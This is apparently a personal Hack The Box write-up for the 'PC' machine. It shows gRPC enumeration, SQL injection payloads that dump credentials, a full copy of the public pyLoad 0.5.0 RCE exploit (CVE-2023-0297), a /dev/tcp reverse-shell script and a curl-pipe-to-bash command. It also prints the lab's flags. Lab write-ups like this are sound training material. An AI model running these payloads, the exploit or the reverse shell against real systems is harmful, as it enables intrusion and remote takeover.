---
title: "PC from HTB"
categories: [Hack The Box]
tags: [Hack The Box]
---
# PC from HTB
`Nmap`gave this:
```bash
nmap -sCV --min-rate 4000 -Pn -p- 10.10.11.214
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-11 20:41 +04
Nmap scan report for 10.10.11.214
Host is up (0.096s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 91:bf:44:ed:ea:1e:32:24:30:1f:53:2c:ea:71:e5:ef (RSA)
|   256 84:86:a6:e2:04:ab:df:f7:1d:45:6c:cf:39:58:09:de (ECDSA)
|_  256 1a:a8:95:72:51:5e:8e:3c:f1:80:f5:42:fd:0a:28:1c (ED25519)
50051/tcp open  unknown
```
I can't access that port. So i searched it up and it's main use is for `gRPC`. There is an command for that: `grpcurl`and i used it. I'm tired and can't explain. I basically used `sql injection`:
```bash
giorgi@darkfears31:~$ grpcurl -plaintext 10.10.11.214:50051 list
SimpleApp
grpc.reflection.v1alpha.ServerReflection
giorgi@darkfears31:~$ grpcurl -plaintext 10.10.11.214:50051 list SimpleApp
SimpleApp.LoginUser
SimpleApp.RegisterUser
SimpleApp.getInfo
giorgi@darkfears31:~$ grpcurl -plaintext 10.10.11.214:50051 describe SimpleApp.LoginUser
Failed to resolve symbol "SimpleApp.LoginUser": Symbol not found: SimpleApp.LoginUser
giorgi@darkfears31:~$ grpcurl -plaintext 10.10.11.214:50051 describe SimpleApp
SimpleApp is a service:
service SimpleApp {
  rpc LoginUser ( .LoginUserRequest ) returns ( .LoginUserResponse );
  rpc RegisterUser ( .RegisterUserRequest ) returns ( .RegisterUserResponse );
  rpc getInfo ( .getInfoRequest ) returns ( .getInfoResponse );
}
giorgi@darkfears31:~$ grpcurl -plaintext 10.10.11.214:50051 describe LoginUserRequest
LoginUserRequest is a message:
message LoginUserRequest {
  string username = 1;
  string password = 2;
}
giorgi@darkfears31:~$ grpcurl -plaintext 10.10.11.214:50051 describe LoginUserResponse
LoginUserResponse is a message:
message LoginUserResponse {
  string message = 1;
}
giorgi@darkfears31:~$ grpcurl -plaintext 10.10.11.214:50051 describe RegisterUserRequest
RegisterUserRequest is a message:
message RegisterUserRequest {
  string username = 1;
  string password = 2;
}
giorgi@darkfears31:~$ grpcurl -plaintext 10.10.11.214:50051 describe RegisterUserResponse
RegisterUserResponse is a message:
message RegisterUserResponse {
  string message = 1;
}
giorgi@darkfears31:~$ grpcurl -plaintext 10.10.11.214:50051 describe getInfoRequest
getInfoRequest is a message:
message getInfoRequest {
  string id = 1;
}
giorgi@darkfears31:~$ grpcurl -plaintext 10.10.11.214:50051 describe getInfoResponse
getInfoResponse is a message:
message getInfoResponse {
  string message = 1;
}
giorgi@darkfears31:~$ grpcurl -plaintext -format text -d 'username: "shavi", password: "gio1"' 10.10.11.214:50051 SimpleApp.RegisterUser
message: "Account created for user shavi!"
giorgi@darkfears31:~$ grpcurl -plaintext -format text -vv -d 'username: "shavi", password: "gio1"' 10.10.11.214:50051 SimpleApp.LoginUser

Resolved method descriptor:
rpc LoginUser ( .LoginUserRequest ) returns ( .LoginUserResponse );

Request metadata to send:
(empty)

Response headers received:
content-type: application/grpc
grpc-accept-encoding: identity, deflate, gzip

Estimated response size: 17 bytes

Response contents:
message: "Your id is 580."

Response trailers received:
token: b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoic2hhdmkiLCJleHAiOjE3MjM0MDUyNzd9.ISV44AC7j0HQFiIrE5PsaeSyEkuSmGUFgvCfoEBVpCo' # be sure to double check the ID
giorgi@darkfears31:~$ grpcurl -plaintext -format text -H 'token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoic2hhdmkiLCJleHAiOjE3MjM0MDUyNzd9.ISV44AC7j0HQFiIrE5PsaeSyEkuSmGUFgvCfoEBVpCo' -d 'id: "580"' 10.10.11.214:50051 SimpleApp.getInfo
message: "Will update soon."
giorgi@darkfears31:~$ grpcurl -plaintext -format text -H 'token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoic2hhdmkiLCJleHAiOjE3MjM0MDUyNzd9.ISV44AC7j0HQFiIrE5PsaeSyEkuSmGUFgvCfoEBVpCo' -d 'id: "580 OR 1=1"' 10.10.11.214:50051 SimpleApp.getInfo
message: "The admin is working hard to fix the issues."
giorgi@darkfears31:~$ grpcurl -plaintext -format text -H 'token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoic2hhdmkiLCJleHAiOjE3MjM0MDUyNzd9.ISV44AC7j0HQFiIrE5PsaeSyEkuSmGUFgvCfoEBVpCo' -d 'id: "580 UNION SELECT 1-- -"' 10.10.11.214:50051 SimpleApp.getInfo
message: "1"
giorgi@darkfears31:~$ grpcurl -plaintext -format text -H 'token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoic2hhdmkiLCJleHAiOjE3MjM0MDUyNzd9.ISV44AC7j0HQFiIrE5PsaeSyEkuSmGUFgvCfoEBVpCo' -d 'id: "123 UNION SELECT GROUP_CONCAT(name, \",\") FROM pragma_table_info(\"accounts\");--"' 10.10.11.214:50051 SimpleApp.getInfo
message: "username,password"
giorgi@darkfears31:~$ grpcurl -plaintext -format text -H 'token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoic2hhdmkiLCJleHAiOjE3MjM0MDUyNzd9.ISV44AC7j0HQFiIrE5PsaeSyEkuSmGUFgvCfoEBVpCo' -d 'id: "123 UNION SELECT GROUP_CONCAT(username || password) FROM accounts;--"' 10.10.11.214:50051 SimpleApp.getInfo
message: "adminadmin,sauHereIsYourPassWord1431"
```
And there it is: Password ---- HereIsYourPassWord1431        Username ---- sau

Connect to `ssh` with this credentials. And get the user flag:
***
User Flag is: a5a6a24888a0510e7d6b683d1afcc9de
***
```bash
sau@pc:~$ ss -tlpn
State               Recv-Q              Send-Q                           Local Address:Port                              Peer Address:Port              Process
LISTEN              0                   4096                             127.0.0.53%lo:53                                     0.0.0.0:*
LISTEN              0                   128                                    0.0.0.0:22                                     0.0.0.0:*
LISTEN              0                   5                                    127.0.0.1:8000                                   0.0.0.0:*
LISTEN              0                   128                                    0.0.0.0:9666                                   0.0.0.0:*
```
This shows that there are two ports running locally, but we don't know what so let's do `port forwarding to access it`. On our machine run:
```bash
$ ssh -f -N -L 1235:127.0.0.1:8000 -L 9666:127.0.0.1:9666 sau@10.10.11.214
sau@10.10.11.214's password:
```
Then access the `localhost:8000`and on that is running `pyload`. Go to `ssh`and check the version:
```python
pyload --version
pyLoad 0.5.0
```
There is an exploit for that `RCE`and with that we have to get `reverse shell`
From `exploit-db`i got this code:
```python
# Exploit Title: PyLoad 0.5.0 - Pre-auth Remote Code Execution (RCE)
# Date: 06-10-2023
# Credits: bAu @bauh0lz
# Exploit Author: Gabriel Lima (0xGabe)
# Vendor Homepage: https://pyload.net/
# Software Link: https://github.com/pyload/pyload
# Version: 0.5.0
# Tested on: Ubuntu 20.04.6
# CVE: CVE-2023-0297

import requests, argparse

parser = argparse.ArgumentParser()
parser.add_argument('-u', action='store', dest='url', required=True, help='Target url.')
parser.add_argument('-c', action='store', dest='cmd', required=True, help='Command to execute.')
arguments = parser.parse_args()

def doRequest(url):
    try:
        res = requests.get(url + '/flash/addcrypted2')
        if res.status_code == 200:
            return True
        else:
            return False

    except requests.exceptions.RequestException as e:
        print("[!] Maybe the host is offline :", e)
        exit()

def runExploit(url, cmd):
    endpoint = url + '/flash/addcrypted2'
    if " " in cmd:
        validCommand = cmd.replace(" ", "%20")
    else:
        validCommand = cmd

    payload = 'jk=pyimport%20os;os.system("'+validCommand+'");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa'
    test = requests.post(endpoint, headers={'Content-type': 'application/x-www-form-urlencoded'},data=payload)
    print('[+] The exploit has be executeded in target machine. ')

def main(targetUrl, Command):
    print('[+] Check if target host is alive: ' + targetUrl)
    alive = doRequest(targetUrl)
    if alive == True:
        print("[+] Host up, let's exploit! ")
        runExploit(targetUrl,Command)
    else:
        print('[-] Host down! ')

if(arguments.url != None and arguments.cmd != None):
    targetUrl = arguments.url
    Command = arguments.cmd
    main(targetUrl, Command)
```
Giving this code `reverse shell`commands will not run it because it doesn't like `special characters`so create `reverse.sh `:
```bash
bash -c '/bin/sh -i >& /dev/tcp/10.10.16.2/1234 0>&1'
```
Then start `python3 -m http.server 8001`and execute this code:
```python
python3 pyload.py -u http://localhost:8000 -c "curl 10.10.16.2:8001/reverse.sh| bash"
```
This will get you connection on `NetCat`and you are root.
***
Root Flag is: f2371dd1159ce579cde530425eb577b5
***
![](/assets/images/Screenshot from 2024-08-11 21-51-09.png)
